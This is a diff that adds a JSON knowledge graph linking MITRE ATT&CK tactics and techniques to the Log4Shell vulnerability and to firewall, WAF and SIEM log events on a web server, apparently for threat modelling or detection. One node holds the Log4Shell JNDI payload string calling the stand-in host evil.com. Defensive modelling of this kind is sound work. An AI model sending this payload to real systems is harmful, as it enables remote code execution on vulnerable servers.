@@ -1,0 +1,108 @@
+{
+  "nodes": [
+    {
+      "id": "TA0001",
+      "type": "Tactic",
+      "name": "Initial Access",
+      "framework": "MITRE ATT&CK"
+    },
+    {
+      "id": "TA0002",
+      "type": "Tactic",
+      "name": "Execution",
+      "framework": "MITRE ATT&CK"
+    },
+    {
+      "id": "T1190",
+      "type": "Technique",
+      "name": "Exploit Public-Facing Application",
+      "framework": "MITRE ATT&CK"
+    },
+    {
+      "id": "T1059",
+      "type": "Technique",
+      "name": "Command and Scripting Interpreter",
+      "framework": "MITRE ATT&CK"
+    },
+    {
+      "id": "CVE-2021-44228",
+      "type": "Vulnerability",
+      "name": "Log4Shell"
+    },
+    {
+      "id": "JNDI-Payload",
+      "type": "Payload",
+      "value": "${jndi:ldap://evil.com/a}"
+    },
+    {
+      "id": "FW-LOG-001",
+      "type": "LogEvent",
+      "source": "Firewall",
+      "message": "External connection to web server"
+    },
+    {
+      "id": "WAF-LOG-001",
+      "type": "LogEvent",
+      "source": "WAF",
+      "message": "JNDI payload detected in HTTP header"
+    },
+    {
+      "id": "SIEM-LOG-001",
+      "type": "LogEvent",
+      "source": "SIEM",
+      "message": "JNDI lookup leading to RCE"
+    },
+    {
+      "id": "Web-Server",
+      "type": "Device",
+      "role": "Public Web Application"
+    }
+  ],
+  "edges": [
+    {
+      "from": "T1190",
+      "to": "TA0001",
+      "rel": "PART_OF"
+    },
+    {
+      "from": "T1059",
+      "to": "TA0002",
+      "rel": "PART_OF"
+    },
+    {
+      "from": "T1190",
+      "to": "CVE-2021-44228",
+      "rel": "EXPLOITS"
+    },
+    {
+      "from": "T1190",
+      "to": "JNDI-Payload",
+      "rel": "USES_PAYLOAD"
+    },
+    {
+      "from": "WAF-LOG-001",
+      "to": "T1190",
+      "rel": "INDICATES"
+    },
+    {
+      "from": "SIEM-LOG-001",
+      "to": "T1059",
+      "rel": "INDICATES"
+    },
+    {
+      "from": "FW-LOG-001",
+      "to": "Web-Server",
+      "rel": "OBSERVED_ON"
+    },
+    {
+      "from": "WAF-LOG-001",
+      "to": "Web-Server",
+      "rel": "OBSERVED_ON"
+    },
+    {
+      "from": "SIEM-LOG-001",
+      "to": "Web-Server",
+      "rel": "OBSERVED_ON"
+    }
+  ]
+}
